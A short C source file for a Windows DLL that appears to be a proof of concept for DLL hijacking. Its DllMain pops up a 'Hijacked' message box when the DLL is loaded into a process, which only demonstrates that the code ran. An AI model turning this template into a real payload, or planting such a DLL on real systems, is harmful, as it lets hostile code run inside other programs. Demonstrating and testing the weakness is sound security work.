#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <wchar.h>

BOOL WINAPI DllMain(HINSTANCE hinstdll, DWORD fdwreason, LPVOID lpreserved)
{
    HANDLE threadhandle;
    switch (fdwreason)
    {
    case DLL_PROCESS_ATTACH:
        MessageBox(NULL, "Hijacked", "This was run from c:\\evil\\system32", 0);
        break;
    break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
